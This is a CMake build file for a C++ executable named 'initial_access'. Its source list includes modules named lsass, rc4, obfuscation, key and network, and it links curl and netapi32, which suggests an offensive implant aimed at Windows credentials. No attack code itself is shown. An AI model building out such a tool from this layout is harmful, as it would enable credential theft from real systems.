cmake_minimum_required(VERSION 3.26)
project(initial_access)

set(CMAKE_CXX_STANDARD 26)

set(CMAKE_WINDOWS_EXPORT_ALL_SYMBOLS ON)
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")




find_package(ZLIB REQUIRED)
find_package(CURL CONFIG REQUIRED)


add_executable(
    initial_access
    src/main.cpp
    src/network/network.cpp
    src/base64/base64.cpp
    src/rc4/rc4.cpp
    src/key/key.cpp
    src/lsass/lsass.cpp
    src/obfuscation/obfuscation.cpp
    src/z85/z85_impl.cpp
    src/z85/z85.c
)
target_link_libraries(initial_access -static ZLIB::ZLIB CURL::libcurl netapi32)
